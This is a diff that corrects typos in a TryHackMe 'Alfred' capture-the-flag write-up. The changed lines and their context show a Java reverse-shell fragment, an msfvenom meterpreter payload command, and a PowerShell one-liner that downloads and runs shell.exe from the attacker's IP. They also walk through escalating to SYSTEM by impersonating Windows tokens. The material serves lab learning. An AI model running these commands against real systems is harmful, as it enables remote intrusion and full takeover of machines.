@@ -31,7 +31,7 @@ date: 2021-08-28
 ‎
 
 
-### After logged in as admin, it brought us to tis page, where it can be used to manage Jenkins
+### After logged in as admin, it brought us to this page, where it can be used to manage Jenkins
 
 ![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/index.png)
 
@@ -58,14 +58,14 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/ncat.png)
 
-<p style="color:orange;">We are able to get out first flag</p>
+<p style="color:orange;">We are able to get our first flag</p>
 
 ![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/flag1.png)
 
 ‎
 
 
-### It's always good to always to obtain a better shell to get better flexibility . Thus I had attempted to upgrade this simple shell to a meterpreter shell and hosting it on port 80
+### It's always good to always to obtain a better shell for higher flexibility. Thus I had attempted to upgrade this simple shell to a meterpreter shell and hosted it on port 80
 ```
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.21.149 LPORT=8000 -f exe -o shell.exe
 ```
@@ -80,7 +80,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 ‎
 
 
-### However, this machine has a older version of powershell  which didn't support "Invoke-WebRequest" library (alternative to wget). Thus, another approach was used to download our meterpreter payload and a meterpreter shell was obtained
+### However, this machine runs on older version of powershell  which does not support `Invoke-WebRequest` library (alternative to wget). Thus, another approach was used to download our meterpreter payload to obtain a meterpreter shell
 ```
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.21.149/shell.exe','shell.exe')" && shell.exe
 ```
@@ -93,9 +93,9 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.21.149/
 ‎
 
 
-### In order to privileges escalate we can impersonate windows tokens.
+### In order to privilege escalate we can impersonate windows tokens.
 ### Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).
-### Thus, we can view all the privileges using "whoami /priv". We can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. We can use the incognito module that will allow us to exploit this vulnerability
+### Thus, we can view all the privileges using `whoami /priv`. We can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. We can use the incognito module that will allow us to exploit this vulnerability
 ```
 whoami /priv
 ```
@@ -104,7 +104,7 @@ whoami /priv
 ‎
 
 
-### We can list user token by using the command "list_tokens -u". We are able to see that NT Authority\System token is available. We then can proceed impersonating the token by executing "impersonate_token NT AUTHORITY\SYSTEM" to escalate our privilege
+### We can list user token by using the command `list_tokens -u`. We are able to see that NT Authority\System token is available. We then can proceed impersonating the token by executing `impersonate_token NT AUTHORITY\SYSTEM` to escalate our privilege
 
 ![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/escalation.png)
 
@@ -112,6 +112,6 @@ whoami /priv
 
 
 ### However, even though we have a higher privileged token, we may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). 
-### To mitigate from this, we can migrate to a process with correct permissions. The safest process to pick is the services.exe process.
+### To mitigate from this, we can migrate to a process with correct permissions. The safest process to pick is the `services.exe` process.
 
 ![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/root.png)
